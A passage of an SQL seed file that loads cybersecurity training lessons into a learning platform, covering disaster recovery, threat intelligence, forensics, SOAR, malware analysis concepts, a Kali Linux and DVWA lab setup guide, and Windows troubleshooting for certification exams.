## Backup Strategies

| Type | Description | Speed | Storage |
|------|-------------|-------|---------|
| **Full** | Copies all data | Slow to back up, fast to restore | Most storage |
| **Incremental** | Copies only data changed since last backup (any type) | Fast backup, slow restore (needs full + all incrementals) | Least storage |
| **Differential** | Copies all data changed since last full backup | Medium | Medium |

## Recovery Sites

| Site | Description | Cost | Recovery Speed |
|------|-------------|------|----------------|
| **Hot site** | Fully equipped, real-time data replication; ready immediately | Highest | Minutes to hours |
| **Warm site** | Hardware in place but needs data restoration | Medium | Hours to a day |
| **Cold site** | Empty facility; hardware must be procured and installed | Lowest | Days to weeks |

## Testing Types

- **Tabletop exercise:** Discussion-based walkthrough with stakeholders.
- **Simulation:** Simulated disaster; team executes the plan without actual failover.
- **Parallel test:** Recovery systems brought online alongside production (production stays live).
- **Full interruption test:** Production shut down; recovery systems take over. Highest risk, highest confidence.

## Key takeaway

BCP/DRP ensures the organisation survives disruptions. Know the metrics (RTO, RPO), backup types, recovery sites, and testing methods.

## Exam alignment

CompTIA Security+ (SY0-701): Domain 3.4 — Resilience and recovery. ISC² CC: Domain 4 — Business continuity.
$md$, 25, 3);

-- ========== BH-OPS-2: CySA+ gap-fill ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

('b0000000-0000-4000-8000-000000000041', 'Threat Intelligence and Frameworks',
 'STIX, TAXII, MITRE ATT&CK, and threat intelligence lifecycle for CySA+ alignment.',
$md$
# Threat Intelligence and Frameworks

## Introduction

Threat intelligence (TI) turns raw threat data into actionable information. CySA+ expects analysts to understand TI sources, formats, and how frameworks like MITRE ATT&CK support detection and response.

## Threat Intelligence Lifecycle

1. **Direction:** Define what you need to know (e.g. "What APT groups target healthcare?").
2. **Collection:** Gather data — open-source (OSINT), commercial feeds, ISACs, internal logs.
3. **Processing:** Normalise and enrich data (e.g. correlate IPs with known malware families).
4. **Analysis:** Produce actionable intelligence — IOCs, TTPs, risk assessments.
5. **Dissemination:** Share with the right audience — SOC analysts, management, partner organisations.
6. **Feedback:** Evaluate: was the intelligence useful? Refine future collection.

## TI Sharing Standards

| Standard | Purpose |
|----------|---------|
| **STIX (Structured Threat Information Expression)** | A language for describing threat intelligence: indicators, threat actors, campaigns, TTPs. JSON-based. |
| **TAXII (Trusted Automated Exchange of Intelligence Information)** | A protocol for exchanging STIX data between organisations. Supports push (publish) and pull (subscribe) models. |

## MITRE ATT&CK

ATT&CK is a knowledge base of adversary tactics and techniques based on real-world observations.

| Component | Description |
|-----------|-------------|
| **Tactics** | The adversary's goal at each stage (e.g. Initial Access, Execution, Persistence, Exfiltration) |
| **Techniques** | How the adversary achieves the tactic (e.g. T1566 Phishing, T1059 Command and Scripting) |
| **Sub-techniques** | More specific methods (e.g. T1566.001 Spearphishing Attachment) |

**How SOC analysts use ATT&CK:**
- Map detection rules to techniques to identify coverage gaps.
- Investigate incidents: identify which techniques the attacker used.
- Threat hunting: proactively search for specific techniques.
- Communicate: use a common language across teams and organisations.

## Key takeaway

Threat intelligence provides context; frameworks like MITRE ATT&CK provide structure. Together they help SOC teams detect, hunt, and respond more effectively.

## Exam alignment

CompTIA CySA+ (CS0-003): Domain 1.2 — Threat intelligence concepts; MITRE ATT&CK. SSCP: Domain 7 — Systems and application security (threat frameworks).
$md$, 25, 4),

('b0000000-0000-4000-8000-000000000042', 'Digital Forensics and Evidence Handling',
 'Forensic process, evidence integrity, and chain of custody for CySA+ alignment.',
$md$
# Digital Forensics and Evidence Handling

## Introduction

When an incident may have legal consequences, how you handle evidence matters as much as what you find. CySA+ expects analysts to understand forensic principles even if they are not specialist forensic examiners.

## The Forensic Process

1. **Identification:** Determine what evidence exists and where it is (logs, disks, memory, network captures).
2. **Preservation:** Protect evidence from modification. Create forensic images (bit-for-bit copies); use write blockers.
3. **Collection:** Collect evidence in order of volatility (most volatile first):
   - CPU registers and cache (seconds)
   - RAM (minutes)
   - Disk (hours to days)
   - Backups and logs (days to months)
4. **Examination:** Analyse the evidence using forensic tools (e.g. Autopsy, FTK, Volatility for memory analysis).
5. **Analysis:** Interpret the findings — timeline reconstruction, attribution, scope determination.
6. **Reporting:** Document findings in a clear, factual report suitable for management or legal proceedings.

## Chain of Custody

The chain of custody is a documented record of who handled evidence, when, and what they did with it. It ensures evidence integrity and admissibility in court.

**Chain of custody log should include:**
- Date and time of collection
- Who collected it
- Description of the item
- Storage location
- Every transfer (who, when, why)
- Hash values (SHA-256) to prove the evidence has not been altered

## Key Principles

- **Do not alter the original.** Always work on a forensic copy.
- **Document everything.** Screenshot, photograph, and log every action.
- **Use validated tools.** Use forensic tools that produce verifiable, repeatable results.
- **Act within authority.** Ensure you have legal authorisation to examine the evidence (company policy, legal hold, or warrant).

## Key takeaway

Forensics is about finding the truth while preserving the evidence. Follow the process: identify, preserve, collect (by volatility), examine, analyse, report. Maintain the chain of custody throughout.

## Exam alignment

CompTIA CySA+ (CS0-003): Domain 4.3 — Forensic concepts; evidence handling. SSCP: Domain 7 — Incident response and recovery.
$md$, 22, 4);

-- ========== BH-SPEC-SOC: CySA+ / SC-200 gap-fill ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES

('b0000000-0000-4000-8000-000000000051', 'SOAR and Automation',
 'Security orchestration, automation, and response concepts for advanced SOC operations.',
$md$
# SOAR and Automation

## Introduction

As the volume of security alerts grows, manual investigation does not scale. SOAR (Security Orchestration, Automation, and Response) platforms help SOC teams automate repetitive tasks, orchestrate tools, and respond faster.

## What is SOAR?

| Component | Description |
|-----------|-------------|
| **Orchestration** | Connects multiple security tools (SIEM, EDR, firewall, ticketing) so they work together through a single workflow. |
| **Automation** | Executes predefined actions without human intervention — e.g. enrich an IP, block a domain, disable an account. |
| **Response** | Standardises incident response with **playbooks** — step-by-step procedures that can be partially or fully automated. |

## Playbook Example: Phishing Response

1. **Trigger:** SIEM alert — user reported a phishing email.
2. **Automated enrichment:** Extract sender address, URLs, and attachments. Check URLs against threat intelligence feeds. Check attachment hash on VirusTotal.
3. **Decision (automated or analyst):** Is the email malicious? If yes, continue. If benign, close alert.
4. **Automated response:** Block sender domain at the email gateway. Search mailboxes for the same email and quarantine all copies. Disable any links clicked by users.
5. **Analyst action:** Investigate whether any user entered credentials; if so, force password reset and check for suspicious login activity.
6. **Automated closure:** Update the ticket with findings, actions, and resolution. Notify the reporting user.

## Benefits of SOAR

- **Speed:** Automated enrichment and response in seconds vs. minutes/hours manually.
- **Consistency:** Playbooks ensure every incident is handled the same way.
- **Efficiency:** Analysts focus on complex investigations; routine tasks are automated.
- **Metrics:** Track MTTD, MTTR, and playbook execution to measure SOC performance.

## When Automation is Not Appropriate

- **Novel or complex incidents** — require human judgement.
- **High-impact actions** (e.g. shutting down a production server) — should require analyst approval.
- **Legal or HR-sensitive cases** — human oversight is essential.

## Key takeaway

SOAR automates the routine so analysts can focus on the complex. Effective SOAR requires well-designed playbooks, good tool integration, and clear escalation criteria.

## Exam alignment

CompTIA CySA+ (CS0-003): Domain 4 — Incident response automation. Microsoft SC-200: Automate responses with Microsoft Sentinel.
$md$, 24, 4),

('b0000000-0000-4000-8000-000000000052', 'Malware Analysis Fundamentals',
 'Static and dynamic malware analysis techniques for threat hunters.',
$md$
# Malware Analysis Fundamentals

## Introduction

Threat hunters and advanced SOC analysts need to understand malware behaviour to write better detections and respond to incidents. You do not need to be a reverse engineer, but you should know the basics of static and dynamic analysis.

## Types of Malware

| Type | Behaviour |
|------|-----------|
| **Virus** | Attaches to a legitimate file; spreads when the file is executed |
| **Worm** | Self-replicates across networks without user interaction |
| **Trojan** | Disguised as legitimate software; does not replicate |
| **Ransomware** | Encrypts data and demands payment for decryption |
| **Rootkit** | Hides deep in the OS to maintain persistent, stealthy access |
| **Keylogger** | Records keystrokes to capture credentials |
| **RAT (Remote Access Trojan)** | Gives the attacker remote control of the system |
| **Fileless malware** | Lives in memory; uses legitimate tools (e.g. PowerShell) — hard to detect |

## Static Analysis (without running the malware)

1. **File hash:** Calculate SHA-256 and check against threat intelligence (VirusTotal, malware databases).
2. **File metadata:** Check file name, size, type, timestamps, digital signature (is it signed? Is the signature valid?).
3. **Strings analysis:** Extract readable strings from the binary — look for URLs, IP addresses, file paths, registry keys.
4. **PE header analysis:** For Windows executables — check imported libraries and functions. Imports like `CreateRemoteThread`, `VirtualAllocEx` suggest injection capabilities.

## Dynamic Analysis (running the malware in a sandbox)

1. **Sandboxing:** Execute the malware in an isolated virtual environment (e.g. Cuckoo Sandbox, Any.Run, Joe Sandbox).
2. **Monitor behaviour:** File system changes, registry modifications, network connections, process creation.
3. **Network analysis:** Capture traffic to identify command-and-control (C2) communication — domains, IPs, protocols.
4. **Compare results:** Cross-reference observed IOCs with threat intelligence to attribute the malware to a known campaign.

## Key takeaway

Static analysis tells you what the malware looks like; dynamic analysis tells you what it does. Both are needed for effective detection and response. Always analyse in a sandbox — never on a production system.

## Exam alignment

CompTIA CySA+ (CS0-003): Domain 2 — Malware analysis concepts. Microsoft SC-200: Investigate threats using Microsoft Defender.
$md$, 24, 4);

-- ==================================================================================
-- KALI LINUX SETUP GUIDE + CAPSTONE PROJECTS
-- ==================================================================================

-- ========== KALI SETUP GUIDE (Bridge Module 3 — Operating Systems) ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000003', 'Kali Linux Setup Guide',
 'Install and configure Kali Linux for all hands-on capstone projects in this programme.',
$md$
# Kali Linux Setup Guide

## Introduction

Several capstone projects across this programme require **Kali Linux** — the industry-standard Linux distribution used by cybersecurity professionals worldwide. This lesson walks you through setting up Kali on your own computer.

> **Important:** Complete this setup before attempting any capstone project. You will refer back to this guide throughout the programme.

## What is Kali Linux?

Kali Linux is a Debian-based distribution designed for penetration testing, digital forensics, and security auditing. It comes pre-installed with hundreds of security tools including:

| Tool | Purpose |
|------|---------|
| **nmap** | Network scanning and service discovery |
| **Wireshark** | Network packet capture and analysis |
| **nikto** | Web server vulnerability scanning |
| **Lynis** | System security auditing |
| **John the Ripper** | Password strength auditing |
| **Burp Suite (Community)** | Web application security testing |
| **tshark** | Command-line packet analysis |
| **gobuster** | Web directory enumeration |
| **testssl.sh** | SSL/TLS configuration testing |

## Option 1: Kali in VirtualBox (Recommended)

VirtualBox lets you run Kali as a virtual machine inside your existing operating system. This is the safest and most common approach.

### System requirements

- **RAM:** 4 GB minimum (8 GB recommended — Kali gets 2 GB, your host keeps the rest)
- **Disk:** 50 GB free space
- **CPU:** 64-bit processor with virtualisation enabled (Intel VT-x or AMD-V)

### Step-by-step installation

**Step 1 — Install VirtualBox.**
Download from [virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads). Choose the installer for your host operating system (Windows, macOS, or Linux). Run the installer and accept the defaults.

**Step 2 — Download the Kali VM image.**
Go to [kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines). Under **VirtualBox**, download the **64-bit** pre-built image. The file will be approximately 3–4 GB.

**Step 3 — Import into VirtualBox.**
Open VirtualBox. Go to **File → Import Appliance**. Browse to the downloaded file and click **Import**. Wait for the import to complete.

**Step 4 — Configure the VM.**
Select the Kali VM in VirtualBox and click **Settings**:

- **System → Motherboard:** Set Base Memory to at least **2048 MB** (4096 MB is better).
- **System → Processor:** Set CPUs to **2**.
- **Display → Screen:** Set Video Memory to **128 MB**.
- **Network → Adapter 1:** Set to **NAT** (for internet access from inside the VM).

**Step 5 — Start and log in.**
Click **Start**. Kali will boot to a login screen. Log in with:

- **Username:** `kali`
- **Password:** `kali`

**Step 6 — Update Kali.**
Open a terminal (right-click the desktop → **Open Terminal Here**) and run:

```
sudo apt update && sudo apt full-upgrade -y
```

Enter the password `kali` when prompted. This may take 10–20 minutes.

## Option 2: Kali on WSL 2 (Windows 10/11)

Windows Subsystem for Linux runs Kali without a full virtual machine. It is lighter but has limitations.

**Step 1:** Open **PowerShell as Administrator** and run:
```
wsl --install -d kali-linux
```

**Step 2:** Restart your computer when prompted.

**Step 3:** When Kali launches, create a username and password.

**Step 4:** Install the full toolset:
```
sudo apt update && sudo apt install -y kali-linux-large
```

**Step 5 (optional — graphical desktop):** Install Win-KeX:
```
sudo apt install -y kali-win-kex
kex --win -s
```

### WSL limitations

- Some tools requiring raw network access (e.g. certain nmap scans, Wireshark live capture) may not work in WSL.
- For capstones that require packet capture, use VirtualBox instead.
- WSL is best for command-line tools like nmap, nikto, lynis, and tshark.

## Setting Up Practice Targets

Some capstones require you to scan a deliberately vulnerable target. **Never scan systems you do not own or have written permission to scan.**

### Target 1: DVWA (Damn Vulnerable Web Application) via Docker

DVWA is a web application designed to be vulnerable, used for practising web security testing.

**Step 1:** Install Docker on Kali:
```
sudo apt install -y docker.io
sudo systemctl enable docker --now
```

**Step 2:** Pull and run DVWA:
```
sudo docker run -d -p 80:80 vulnerables/web-dvwa
```

**Step 3:** Open Firefox inside Kali and go to `http://localhost`. Log in with:
- **Username:** `admin`
- **Password:** `password`

**Step 4:** Click **Create / Reset Database** at the bottom of the setup page. Then log in again.

DVWA is now running and ready for scanning. To stop it: `sudo docker stop $(sudo docker ps -q)`.

### Target 2: scanme.nmap.org (remote, authorised)

The Nmap Project provides `scanme.nmap.org` specifically for people to practise scanning. You are authorised to scan this host with nmap. Do **not** scan it with other tools (like nikto) — nmap only.

## Taking Screenshots on Kali

Every capstone requires screenshots as evidence. Here are three methods:

### Method 1: Keyboard shortcut (easiest)

- **PrtSc** — captures the full screen.
- **Alt + PrtSc** — captures the active window only.
- Screenshots are saved to your desktop or `~/Pictures/` directory.

### Method 2: XFCE screenshot tool

Applications → **Accessories** → **Screenshot**, or run in terminal:
```
xfce4-screenshooter
```
Choose entire screen, active window, or select a region.

### Method 3: Terminal command

```
# Full screen, saved to a specific file:
xfce4-screenshooter -f -s ~/capstone/task1.png

# Or install scrot for region selection:
sudo apt install -y scrot
scrot -s ~/capstone/task1.png
```

**Tip:** Create a `capstone` folder in your home directory to keep all screenshots organised:
```
mkdir -p ~/capstone
```

## Creating Your Submission PDF

All capstone projects require a **single PDF** submission.

### Using LibreOffice Writer (pre-installed on Kali)

1. Open **Applications → Office → LibreOffice Writer**.
2. **Page 1:** Add a title page with:
   - Your full name
   - Course code (e.g. BH-CYBER2)
   - "Capstone Project"
   - Date
3. **For each task:**
   - Type the task number and heading.
   - Insert your screenshot: **Insert → Image** → select the file.
   - Below the screenshot, write 1–2 sentences explaining what the screenshot shows.
4. Export as PDF: **File → Export as PDF → Export**.

### File naming convention

Name your PDF exactly like this:

```
[CourseCode]-capstone-[FirstName]-[LastName].pdf
```

**Examples:**
- `BH-BRIDGE-capstone-Thabo-Mokoena.pdf`
- `BH-CYBER2-capstone-Sarah-Johnson.pdf`
- `BH-OPS2-capstone-James-Williams.pdf`

### Uploading your submission

Upload your PDF directly on the capstone lesson page in the LMS using the **Upload Capstone** button. You will see a confirmation once uploaded. You may re-upload to replace a previous submission.

## Verification Checklist

After setup, run each command below and confirm it returns version information (no errors):

```
kali@kali:~$ uname -a
Linux kali 6.x.x-kali1-amd64 ...

kali@kali:~$ nmap --version
Nmap version 7.9x ...

kali@kali:~$ nikto -Version
Nikto v2.5.x ...

kali@kali:~$ wireshark --version
Wireshark 4.x.x ...

kali@kali:~$ lynis --version
Lynis 3.x.x ...

kali@kali:~$ tshark --version
TShark (Wireshark) 4.x.x ...

kali@kali:~$ john --help 2>&1 | head -1
John the Ripper ...
```

If any tool is missing, install it with `sudo apt install <tool-name>`.

## Ethical and Legal Notice

**You may only scan systems you own or have explicit written permission to scan.** Unauthorised scanning is illegal in most countries and can result in criminal charges.

Safe targets for capstones:
- **Your own Kali VM** — you always have permission to scan yourself.
- **DVWA / Metasploitable** running on your local network.
- **scanme.nmap.org** — authorised for nmap scanning only.
- Any system where you have **written permission** from the owner.

**Never** scan your school, employer, ISP, or any public server without explicit authorisation.
$md$, 45, 5);

-- ========== NEW CURRICULUM EXPANSION MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  -- BH-FOUND-1: new Module 5
  ('b0000000-0000-4000-8000-000000000015', 'a0000000-0000-4000-8000-000000000002', 'Operating Systems and Troubleshooting', 'Windows and software troubleshooting, operational procedures, and reconnaissance tools.', 5),
  -- BH-FOUND-2: new Module 4
  ('b0000000-0000-4000-8000-000000000024', 'a0000000-0000-4000-8000-000000000003', 'Routing, Switching, and Network Operations', 'Routing protocols, switching, IPv6, network troubleshooting, and analysis tools.', 4),
  -- BH-CYBER-2: new Module 5
  ('b0000000-0000-4000-8000-000000000035', 'a0000000-0000-4000-8000-000000000004', 'Application Security and Automation', 'Web application attacks, secure coding, scripting, email security, and vulnerability scanning tools.', 5),
  -- BH-OPS-2: new Modules 3 and 4
  ('b0000000-0000-4000-8000-000000000043', 'a0000000-0000-4000-8000-000000000005', 'Security Monitoring and Analysis', 'Log analysis, SIEM correlation, network traffic analysis, and Wireshark.', 3),
  ('b0000000-0000-4000-8000-000000000044', 'a0000000-0000-4000-8000-000000000005', 'Vulnerability and Endpoint Management', 'Vulnerability scanning, EDR, patch management, and access controls for operations.', 4),
  -- BH-SPEC-SOC: new Modules 3 and 4
  ('b0000000-0000-4000-8000-000000000053', 'a0000000-0000-4000-8000-000000000006', 'Advanced Detection and Analysis', 'Windows Event Logs, email analysis, EDR workflows, and malware triage.', 3),
  ('b0000000-0000-4000-8000-000000000054', 'a0000000-0000-4000-8000-000000000006', 'Cloud SOC and Detection Engineering', 'Cloud monitoring, detection engineering, tshark, and Sigma rules.', 4),
  -- BH-ADV: new Modules 3, 4, 5, 6
  ('b0000000-0000-4000-8000-000000000063', 'a0000000-0000-4000-8000-000000000007', 'Asset Security and Cryptography', 'Data classification, security models, and cryptographic systems for CISSP.', 3),
  ('b0000000-0000-4000-8000-000000000064', 'a0000000-0000-4000-8000-000000000007', 'Network Security and Software Security', 'Secure network architecture, protocols, SDLC, and application security.', 4),
  ('b0000000-0000-4000-8000-000000000065', 'a0000000-0000-4000-8000-000000000007', 'Security Assessment, Operations, and Incident Management', 'Pentesting methodologies, operations management, and incident leadership.', 5),
  ('b0000000-0000-4000-8000-000000000066', 'a0000000-0000-4000-8000-000000000007', 'Information Security Programme and Governance', 'Programme management, maturity models, COBIT, and ISO 27001.', 6);

-- =====================================================================
-- ========== CURRICULUM EXPANSION — NEW LESSONS ==========
-- =====================================================================

-- ========== BH-FOUND-1: Module 5 — Operating Systems and Troubleshooting ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000015', 'Windows OS Management and Command-Line Tools',
 'Windows editions, management tools, and command-line fundamentals for CompTIA A+ Core 2.',
$md$
# Windows OS Management and Command-Line Tools

## Objectives

By the end of this lesson you will be able to:

- Identify Windows editions (Home, Pro, Enterprise) and their key differences.
- Use essential Windows management tools: Task Manager, Event Viewer, Device Manager, Disk Management, System Configuration (msconfig), and Resource Monitor.
- Execute basic commands in Command Prompt and PowerShell.
- Navigate Windows Settings and Control Panel for common administrative tasks.

## Windows Editions

| Edition | Key Features | Use Case |
|---------|-------------|----------|
| **Windows Home** | Basic features, no domain join, no BitLocker, no Group Policy | Home users |
| **Windows Pro** | Domain join, BitLocker, Group Policy, Remote Desktop host, Hyper-V | Small business, power users |
| **Windows Enterprise** | All Pro features + DirectAccess, AppLocker, Windows To Go, BranchCache | Large organisations via volume licensing |
| **Windows Education** | Similar to Enterprise, licensed for schools | Education institutions |

**Exam tip (A+):** Know that BitLocker, Group Policy, and domain join are **not** available in Home edition.

## Essential Management Tools

### Task Manager (Ctrl + Shift + Esc)

Task Manager shows running processes, CPU/memory/disk/network usage, startup programmes, and services. Use it to:

- **End** an unresponsive application (Processes tab → right-click → End task).
- **Check resource usage** to identify what is consuming CPU or memory.
- **Disable startup programmes** that slow boot time (Startup tab).
- **View services** and their status (Services tab).

### Event Viewer (eventvwr.msc)

Event Viewer records system events in logs. The three most important logs are:

| Log | Contents |
|-----|----------|
| **Application** | Events from applications (crashes, errors, warnings) |
| **System** | OS events (driver failures, service start/stop, hardware errors) |
| **Security** | Logon events, audit successes and failures, policy changes |

Event types: **Information** (normal), **Warning** (potential issue), **Error** (failure occurred), **Critical** (severe failure). Security events also have **Audit Success** and **Audit Failure**.

### Device Manager (devmgmt.msc)

Shows all hardware devices. A yellow triangle with an exclamation mark indicates a driver problem. Use it to update, roll back, or disable drivers. A red X means the device is disabled.

### Disk Management (diskmgmt.msc)

Manage partitions, format drives, assign drive letters, extend or shrink volumes, and initialise new disks. Know the difference between **MBR** (up to 4 primary partitions, 2 TB max) and **GPT** (128 partitions, supports disks > 2 TB, requires UEFI).

### System Configuration (msconfig)

Controls boot options, services, and startup. The **Boot** tab lets you enable Safe Mode. The **Services** tab lets you disable non-Microsoft services for troubleshooting (check "Hide all Microsoft services" first).

### Resource Monitor (resmon)

More detailed than Task Manager. Shows per-process CPU, memory, disk I/O, and network activity. Use it to find which process is reading/writing to disk or using network bandwidth.

## Command Prompt Essentials

| Command | Purpose | Example |
|---------|---------|---------|
| `ipconfig` | Show IP configuration | `ipconfig /all` |
| `ping` | Test connectivity | `ping 8.8.8.8` |
| `tracert` | Trace route to destination | `tracert google.com` |
| `nslookup` | Query DNS | `nslookup example.com` |
| `netstat` | Show active connections | `netstat -an` |
| `sfc /scannow` | System File Checker — repair corrupted files | Run as admin |
| `chkdsk` | Check disk for errors | `chkdsk C: /f` |
| `gpupdate /force` | Refresh Group Policy | Run as admin |
| `shutdown /r /t 0` | Restart immediately | |

## PowerShell Basics

PowerShell uses **cmdlets** in Verb-Noun format:

| Cmdlet | Purpose |
|--------|---------|
| `Get-Process` | List running processes |
| `Stop-Process -Name notepad` | Kill a process |
| `Get-Service` | List services |
| `Get-EventLog -LogName System -Newest 10` | Read last 10 system events |
| `Test-Connection 8.8.8.8` | PowerShell equivalent of ping |
| `Get-NetIPAddress` | Show IP configuration |

PowerShell is more powerful than Command Prompt: it supports scripting, piping objects (not just text), and remote management.

## Control Panel vs Settings

Windows has two interfaces for configuration. **Settings** (modern, touch-friendly) is replacing **Control Panel** (legacy, detailed). For the A+ exam, know both:

| Task | Settings Path | Control Panel Path |
|------|--------------|-------------------|
| Change display resolution | System → Display | Display |
| Uninstall a programme | Apps → Apps & features | Programs and Features |
| Network configuration | Network & Internet | Network and Sharing Center |
| User accounts | Accounts | User Accounts |
| Windows Update | Update & Security | Windows Update |
| Firewall | Update & Security → Windows Security | Windows Defender Firewall |

## Key Takeaways

- Know the differences between Windows editions (Home vs Pro vs Enterprise).
- Task Manager, Event Viewer, and Device Manager are the three most-tested management tools.
- Command Prompt and PowerShell are essential for troubleshooting — practise the common commands.
- Both Control Panel and Settings paths may appear on the exam.
$md$, 35, 1),

('b0000000-0000-4000-8000-000000000015', 'Software and Application Troubleshooting',
 'Diagnose and resolve common software problems including OS boot failures, BSODs, and application crashes.',
$md$
# Software and Application Troubleshooting

## Objectives

By the end of this lesson you will be able to:

- Diagnose common Windows boot problems and apply fixes.
- Identify causes of Blue Screen of Death (BSOD) errors.
- Troubleshoot application crashes, browser issues, and slow performance.
- Apply the malware removal process.

## Windows Boot Process

The simplified boot sequence is: **Power On → POST → UEFI/BIOS → Boot Loader (bootmgr) → Windows Kernel → Login Screen**.

If the boot fails at any stage:

| Symptom | Likely Stage | Fix |
|---------|-------------|-----|
| No display, no beep | POST failure (hardware) | Check power, reseat RAM, test PSU |
| Beep codes | POST failure (specific hardware) | Look up beep code for motherboard |
| "Boot device not found" | Boot loader not found | Check BIOS boot order, repair MBR/BCD |
| Windows logo then restart loop | Kernel/driver failure | Boot to Safe Mode, use Startup Repair |
| BSOD during boot | Driver or system file corruption | Safe Mode → roll back driver, `sfc /scannow` |

### Safe Mode

Safe Mode loads Windows with minimal drivers and services. Access it by:

- **Settings → Recovery → Advanced startup → Restart now** (from within Windows).
- **Hold Shift + click Restart** (from login screen).
- **Interrupt boot 3 times** — Windows enters Automatic Repair, then Advanced Options → Startup Settings.

Safe Mode variants: **Safe Mode** (no network), **Safe Mode with Networking** (has network), **Safe Mode with Command Prompt**.

### Windows Recovery Environment (WinRE)

WinRE provides: **Startup Repair** (automatic fix), **System Restore** (roll back to restore point), **System Image Recovery** (restore from backup image), **Command Prompt** (manual repair), **Uninstall Updates**.

## Blue Screen of Death (BSOD)

A BSOD means Windows encountered a fatal error and stopped to prevent damage. Key information on the BSOD:

- **Stop code** (e.g. `CRITICAL_PROCESS_DIED`, `IRQL_NOT_LESS_OR_EQUAL`, `PAGE_FAULT_IN_NONPAGED_AREA`).
- **What failed** — sometimes shows a driver file name (e.g. `nvlddmkm.sys` = NVIDIA driver).

Common causes and fixes:

| Stop Code | Common Cause | Fix |
|-----------|-------------|-----|
| `DRIVER_IRQL_NOT_LESS_OR_EQUAL` | Faulty or incompatible driver | Update/roll back driver |
| `CRITICAL_PROCESS_DIED` | Corrupt system file | `sfc /scannow`, `DISM /Online /Cleanup-Image /RestoreHealth` |
| `PAGE_FAULT_IN_NONPAGED_AREA` | Bad RAM or driver | Run Windows Memory Diagnostic, update drivers |
| `KERNEL_SECURITY_CHECK_FAILURE` | Driver incompatibility | Update drivers, check for Windows updates |
| `INACCESSIBLE_BOOT_DEVICE` | Storage driver issue after update | Boot to recovery, uninstall recent update |

## Application Troubleshooting

| Problem | Checks |
|---------|--------|
| Application crashes on launch | Check Event Viewer (Application log), update the app, run as administrator, reinstall |
| Application runs slowly | Check Task Manager for high CPU/memory usage, close competing processes, check disk space |
| Application won't install | Check disk space, run as administrator, check compatibility mode, disable antivirus temporarily |
| Browser crashes or slow | Disable extensions, clear cache, reset browser settings, check for malware |
| Browser certificate error | Check system date/time (wrong date causes cert errors), clear browser SSL state |

### Slow Computer Diagnosis Checklist

1. **Task Manager** — is CPU, memory, or disk at 100%? Identify the process.
2. **Startup programmes** — disable unnecessary ones.
3. **Disk space** — at least 10-15% free on the system drive.
4. **Malware** — run a full scan.
5. **Updates** — install pending OS and driver updates.
6. **Fragmentation** — defragment HDD (do NOT defragment SSD).
7. **Hardware** — if none of the above helps, consider a failing HDD (check SMART status) or insufficient RAM.

## Malware Removal Process

The CompTIA A+ exam tests this specific order:

1. **Identify and research** the malware symptoms (pop-ups, slow performance, unknown processes, browser redirects, ransom messages).
2. **Quarantine** the infected system — disconnect from the network to prevent spread.
3. **Disable System Restore** — malware can hide in restore points.
4. **Remediate** — boot to Safe Mode, update antivirus definitions, run a full scan. Use a second-opinion scanner (e.g. Malwarebytes). Delete or quarantine detected threats.
5. **Schedule scans and enable System Restore** — create a new clean restore point.
6. **Educate the user** — explain what happened and how to avoid it.
7. **Document** the incident.

## Key Takeaways

- Know the Windows boot sequence and how to enter Safe Mode and WinRE.
- BSOD stop codes point to the cause — drivers are the most common culprit.
- Application issues: check Event Viewer, Task Manager, and disk space first.
- The malware removal process has a specific order the A+ exam expects.
$md$, 30, 2),

('b0000000-0000-4000-8000-000000000015', 'Operational Procedures, Safety, and Documentation',
 'ESD protection, environmental controls, documentation, ticketing, change management, and scripting basics.',
$md$
# Operational Procedures, Safety, and Documentation

## Objectives

By the end of this lesson you will be able to:

- Describe safety procedures including ESD, electrical safety, and proper lifting.
- Explain environmental controls for IT equipment.
- Document incidents using a ticketing system.
- Describe change management and its purpose.
- Identify basic scripting concepts (Bash, PowerShell, batch).

## Safety Procedures

### Electrostatic Discharge (ESD)

Static electricity can destroy sensitive components (RAM, CPUs, expansion cards). Prevention:

- Wear an **anti-static wrist strap** connected to a grounded surface.
- Work on an **anti-static mat**.
- Touch a grounded metal object before handling components.
- Store components in **anti-static bags**.
- **Never** work on carpet or wear wool clothing when handling components.

### Electrical Safety

- **Never** open a power supply unit (PSU) — capacitors hold lethal charge even when unplugged.
- Disconnect power before working inside a computer.
- Use a surge protector or UPS (uninterruptible power supply).
- Replace damaged power cables immediately.

### Proper Lifting

Servers and UPS units are heavy. Lift with your legs, not your back. Use a cart or get help for equipment over 20 kg.

## Environmental Controls

IT equipment has environmental requirements:

| Factor | Ideal Range | Risk If Exceeded |
|--------|------------|-----------------|
| **Temperature** | 18–27°C (64–80°F) | Overheating causes shutdowns and hardware damage |
| **Humidity** | 40–60% relative | Too low = ESD risk; too high = condensation and corrosion |
| **Ventilation** | Hot aisle / cold aisle airflow in data centres | Poor airflow leads to hot spots |
| **Dust** | Minimise with filters and regular cleaning | Dust clogs fans and acts as insulation |

## Documentation and Ticketing

### Ticketing Systems

Most IT teams use a ticketing system (e.g. ServiceNow, Jira Service Management, osTicket). A good ticket includes:

- **Title** — brief description of the issue.
- **Description** — detailed symptoms, error messages, when it started.
- **Priority** — Critical, High, Medium, Low.
- **Category** — Hardware, Software, Network, Account, etc.
- **Assigned to** — the technician or team.
- **Status** — Open, In Progress, Resolved, Closed.
- **Resolution notes** — what was done to fix it.

### Documentation Types

| Document | Purpose |
|----------|---------|
| **Knowledge base (KB) article** | Step-by-step fix for a known issue |
| **Network diagram** | Visual map of network topology |
| **Asset inventory** | List of all hardware/software with serial numbers, locations, owners |
| **Standard Operating Procedure (SOP)** | Step-by-step instructions for routine tasks |
| **Acceptable Use Policy (AUP)** | Rules for using company IT resources |

## Change Management

Change management ensures that changes to IT systems are planned, tested, approved, and documented. The basic process:

1. **Request** — submit a change request describing what, why, and when.
2. **Review** — a Change Advisory Board (CAB) or change manager reviews the request.
3. **Approve** — the change is approved, deferred, or rejected.
4. **Test** — test the change in a non-production environment.
5. **Implement** — apply the change during an approved maintenance window.
6. **Document** — record what was done and the outcome.
7. **Rollback plan** — always have a plan to reverse the change if it fails.

## Scripting Basics

The A+ exam (SY0-701 also tests this) expects you to recognise basic scripting concepts:

